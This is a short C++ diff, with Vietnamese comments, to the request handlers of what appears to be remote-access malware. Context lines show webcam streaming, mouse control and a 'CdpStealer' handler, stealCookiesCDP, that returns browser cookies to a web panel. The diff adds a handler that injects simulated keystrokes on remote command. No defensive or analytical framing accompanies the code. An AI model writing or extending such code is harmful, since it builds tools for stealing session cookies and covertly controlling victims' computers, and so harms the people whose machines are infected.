@@ -8,6 +8,7 @@
 #include "WebcamStream.h"
 #include "MouseControl.h"
 #include "CdpStealer.h"
+#include "KeyboardControl.h"
 
 // Helper: Trả về JSON status chuẩn
 json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
@@ -222,4 +223,15 @@ json ProcessHandlers::stealCookiesCDP(const json &req)
         {"type", "cookies_result"}, // Tận dụng type cũ để Web UI hiểu
         {"browser", browser},
         {"data", result["data"]}};
+}
+
+json ProcessHandlers::handleKeyboardInput(const json &req)
+{
+    std::string key = req.value("key", "");
+    int keyCode = req.value("keyCode", 0);
+
+    // Gọi hàm giả lập phím
+    KeyboardControl::HandleInput(key, keyCode);
+
+    return {};
 }
